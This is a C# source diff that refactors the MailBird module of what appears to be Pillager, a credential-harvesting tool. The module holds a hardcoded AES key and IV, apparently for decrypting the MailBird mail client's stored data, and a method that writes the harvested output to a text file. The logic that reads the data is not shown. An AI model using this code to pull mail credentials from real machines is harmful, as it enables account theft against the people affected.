@@ -6,14 +6,12 @@ using Pillager.Helper;
 
 namespace Pillager.Mails
 {
-    internal class MailBird
+    internal class MailBird : ICommand
     {
-        public static string MailName = "MailBird";
+        public byte[] key = { 0X35, 0XE0, 0X85, 0X30, 0X8A, 0X6D, 0X91, 0XA3, 0X96, 0X5F, 0XF2, 0X37, 0X95, 0XD1, 0XCF, 0X36, 0X71, 0XDE, 0X7E, 0X5B, 0X62, 0X38, 0XD5, 0XFB, 0XDB, 0X64, 0XA6, 0X4B, 0XD3, 0X5A, 0X05, 0X53 };
+        public byte[] iv = { 0X98, 0X0F, 0X68, 0XCE, 0X77, 0X43, 0X4C, 0X47, 0XF9, 0XE9, 0X0E, 0X82, 0XF4, 0X6B, 0X4C, 0XE8 };
 
-        public static byte[] key = { 0X35, 0XE0, 0X85, 0X30, 0X8A, 0X6D, 0X91, 0XA3, 0X96, 0X5F, 0XF2, 0X37, 0X95, 0XD1, 0XCF, 0X36, 0X71, 0XDE, 0X7E, 0X5B, 0X62, 0X38, 0XD5, 0XFB, 0XDB, 0X64, 0XA6, 0X4B, 0XD3, 0X5A, 0X05, 0X53 };
-        public static byte[] iv = { 0X98, 0X0F, 0X68, 0XCE, 0X77, 0X43, 0X4C, 0X47, 0XF9, 0XE9, 0X0E, 0X82, 0XF4, 0X6B, 0X4C, 0XE8 };
-
-        public static string GetInfo()
+        public string GetInfo()
         {
             StringBuilder sb = new StringBuilder();
             try
@@ -63,7 +61,7 @@ namespace Pillager.Mails
             catch { return sb.ToString(); }
         }
 
-        private static string AESDecrypt(byte[] encryptedBytes, byte[] bKey, byte[] iv)
+        private string AESDecrypt(byte[] encryptedBytes, byte[] bKey, byte[] iv)
         {
             MemoryStream mStream = new MemoryStream(encryptedBytes);
             RijndaelManaged aes = new RijndaelManaged();
@@ -88,15 +86,15 @@ namespace Pillager.Mails
             }
         }
 
-        public static void Save(string path)
+        public override void Save(string path)
         {
             try
             {
                 string result = GetInfo();
                 if (string.IsNullOrEmpty(result)) return;
-                string savepath = Path.Combine(path, MailName);
+                string savepath = Path.Combine(path, "MailBird");
                 Directory.CreateDirectory(savepath);
-                File.WriteAllText(Path.Combine(savepath, MailName + ".txt"), result);
+                File.WriteAllText(Path.Combine(savepath, "MailBird.txt"), result, Encoding.UTF8);
             }
             catch { }
         }
